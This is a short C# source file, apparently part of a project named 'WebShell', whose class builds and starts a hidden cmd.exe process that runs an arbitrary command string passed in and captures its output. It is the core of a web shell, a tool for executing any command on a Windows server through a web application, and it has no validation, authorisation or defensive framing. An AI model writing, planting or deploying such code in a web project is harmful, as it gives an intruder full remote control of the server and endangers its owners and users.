using System.Diagnostics;

namespace WebShell.Controllers;

public class WebShell
{
    public static Process CmdProcess;

    public static void  CommandRequest(string command)
    {
        CmdProcess = new Process();
        CmdProcess.StartInfo = new ProcessStartInfo()
        {
            FileName = "cmd.exe",
            Arguments = @$"/C {command}",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
        };
    }
    
    public static void Run()
    {
        CmdProcess.Start();
        CmdProcess.BeginOutputReadLine();
        CmdProcess.BeginErrorReadLine();
        CmdProcess.WaitForExitAsync(); 
    }
}